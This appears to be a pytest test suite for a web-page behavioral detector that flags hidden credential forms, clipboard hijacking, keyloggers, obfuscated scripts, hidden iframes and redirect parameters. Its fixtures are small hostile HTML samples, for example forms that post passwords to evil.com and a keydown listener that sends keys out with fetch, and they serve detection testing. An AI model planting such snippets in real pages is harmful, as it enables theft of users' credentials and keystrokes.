"""
Test Suite — Layer 6: Behavioral Analysis

Validates HTML parsing for hidden forms, suspicious scripts,
iframe abuse, and risk scoring.
"""

import pytest
from app.services.detection.l6_behavioral import analyze_behavior


class TestBehavioralAnalysisEmpty:
    """Edge cases: no HTML or empty HTML."""

    def test_none_html_returns_defaults(self):
        result = analyze_behavior(None)
        assert result["behavioral_risk"] == 0
        assert result["html_available"] is False
        assert result["hidden_forms"] is False

    def test_empty_string_returns_defaults(self):
        result = analyze_behavior("")
        assert result["behavioral_risk"] == 0
        assert result["html_available"] is False


class TestFormDetection:
    """HTML form analysis tests."""

    def test_hidden_credential_form_detected(self):
        html = """
        <html><body>
        <form action="https://evil.com/steal.php" method="post">
            <input type="hidden" name="token" value="abc">
            <input type="hidden" name="session" value="xyz">
            <input type="password" name="pass">
        </form>
        </body></html>
        """
        result = analyze_behavior(html)
        assert result["hidden_forms"] is True
        assert result["behavioral_risk"] > 0

    def test_normal_login_form(self):
        html = """
        <html><body>
        <form action="/login" method="post">
            <input type="text" name="username">
            <input type="password" name="password">
            <button type="submit">Login</button>
        </form>
        </body></html>
        """
        result = analyze_behavior(html)
        assert result["html_available"] is True

    def test_form_with_suspicious_action(self):
        html = """
        <form action="https://evil.com/capture.php" method="post">
            <input type="password" name="pwd">
        </form>
        """
        result = analyze_behavior(html)
        assert result["form_analysis"]["suspicious_forms"] >= 1


class TestScriptDetection:
    """Malicious JavaScript detection tests."""

    def test_clipboard_hijack_detected(self):
        html = """
        <html><body>
        <script>
            navigator.clipboard.writeText("malicious_address");
        </script>
        </body></html>
        """
        result = analyze_behavior(html)
        assert result["clipboard_hijack"] is True
        assert "clipboard_access" in result["detected_behaviors"]

    def test_keylogger_pattern_detected(self):
        html = """
        <html><body>
        <script>
            document.addEventListener('keydown', function(e) {
                fetch('/log?key=' + e.key);
            });
        </script>
        </body></html>
        """
        result = analyze_behavior(html)
        assert "keylogger_suspected" in result["detected_behaviors"]
        assert result["behavioral_risk"] >= 20

    def test_obfuscation_detected(self):
        html = """
        <html><body>
        <script>
            eval(atob("YWxlcnQoJ3Rlc3QnKQ=="));
        </script>
        </body></html>
        """
        result = analyze_behavior(html)
        assert result["script_analysis"]["obfuscation_detected"] is True

    def test_clean_script_no_flags(self):
        html = """
        <html><body>
        <script>
            console.log("Hello world");
        </script>
        </body></html>
        """
        result = analyze_behavior(html)
        assert len(result["detected_behaviors"]) == 0


class TestIframeDetection:
    """Iframe abuse detection tests."""

    def test_hidden_iframe_detected(self):
        html = """
        <html><body>
        <iframe src="https://evil.com/steal" style="display:none"></iframe>
        </body></html>
        """
        result = analyze_behavior(html)
        assert result["iframe_abuse"] is True

    def test_visible_same_origin_iframe_ok(self):
        html = """
        <html><body>
        <iframe src="/about"></iframe>
        </body></html>
        """
        result = analyze_behavior(html)
        assert result["iframe_abuse"] is False


class TestRedirectAnalysis:
    """URL redirect indicator tests."""

    def test_redirect_params_detected(self):
        result = analyze_behavior(
            "<html></html>",
            url="https://evil.com?redirect=https://google.com&goto=bank"
        )
        assert result["redirect_chain_length"] >= 1
